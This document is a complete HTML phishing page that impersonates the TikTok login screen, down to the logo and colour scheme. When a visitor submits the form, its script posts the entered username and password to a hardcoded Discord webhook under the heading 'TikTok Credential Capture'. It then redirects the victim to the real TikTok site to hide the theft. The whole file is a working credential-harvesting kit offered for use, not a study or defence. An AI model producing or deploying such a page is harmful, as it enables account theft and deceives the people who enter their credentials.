<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #111;
            font-family: 'Montserrat', sans-serif;
            color: #fff;
        }
        .card {
            background: #1e1e1e;
            padding: 2rem;
            border-radius: 12px;
            width: 340px;
            max-width: 90%;
            box-shadow: 0 8px 24px rgba(0,0,0,.6);
            text-align: center;
        }
        .logo {
            margin-bottom: 1.5rem;
            display: flex;
            justify-content: center;
        }
        .logo img {
            width: 120px;
        }
        .card h2 {
            margin: 0 0 1.5rem;
            font-weight: 600;
            font-size: 1.5rem;
            color: #fe2c55;
        }
        .card input {
            width: 100%;
            padding: 0.75rem 1rem;
            margin-bottom: 1rem;
            border: none;
            border-radius: 6px;
            background: #2a2a2a;
            color: #fff;
            font-size: 1rem;
            box-sizing: border-box;
        }
        .card input::placeholder {
            color: #888;
        }
        .card button {
            width: 100%;
            padding: 0.75rem;
            border: none;
            border-radius: 6px;
            background: #fe2c55;
            color: #fff;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background .2s;
        }
        .card button:hover {
            background: #d9254c;
        }
        .footer {
            margin-top: 1.5rem;
            font-size: 0.85rem;
            color: #777;
        }
        .footer a {
            color: #fe2c55;
            text-decoration: none;
        }
        .spinner {
            display: none;
            margin: 10px auto;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #fe2c55;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok">
        </div>
        <h2>Log in to TikTok</h2>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Phone, email or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="submitBtn">Log In</button>
            <div class="spinner" id="spinner"></div>
        </form>
        <div class="footer">
            <a href="#">Forgot password?</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e){
            e.preventDefault();
            
            const btn = document.getElementById('submitBtn');
            const spinner = document.getElementById('spinner');
            
            // UI Feedback
            btn.style.display = 'none';
            spinner.style.display = 'block';
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Send to Discord Webhook
            fetch('https://discord.com/api/webhooks/1566523365798445176/R0hi-_bu9Y1jMCQRsyDUgAudtIj3TgT2x1lQvuPhgsbAkCSdJmr-W7Lr4EP5k5vMjmSE', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content: "**TikTok Credential Capture**\n\n📧 **Email/User:** `" + email + "`\n🔑 **Password:** `" + password + "`"})
            });
            
            // Redirect to actual TikTok site
            setTimeout(() => {
                window.location.href = 'https://www.tiktok.com';
            }, 1500);
        });
    </script>
</body>
</html>
